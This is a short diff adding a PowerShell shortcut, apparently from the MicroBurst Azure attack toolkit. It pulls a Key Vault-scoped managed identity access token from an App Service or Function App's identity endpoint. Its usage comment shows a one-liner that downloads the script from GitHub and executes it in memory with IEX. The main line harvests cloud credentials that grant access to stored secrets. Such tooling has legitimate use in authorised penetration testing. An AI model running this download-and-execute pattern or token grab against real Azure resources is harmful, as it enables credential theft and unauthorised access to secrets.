@@ -1,0 +1,2 @@
+# Usage - returns a Key Vault Scoped Managed Identity token for an App Service or Function App - IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/Shortcuts/AppServicesManagedIdentity-vault.ps1")
+(Invoke-RestMethod -Method Get -Headers @{"X-IDENTITY-HEADER"="$env:IDENTITY_HEADER"} -Uri $($env:IDENTITY_ENDPOINT + "?resource=https://vault.azure.net&api-version=2019-08-01")).access_token
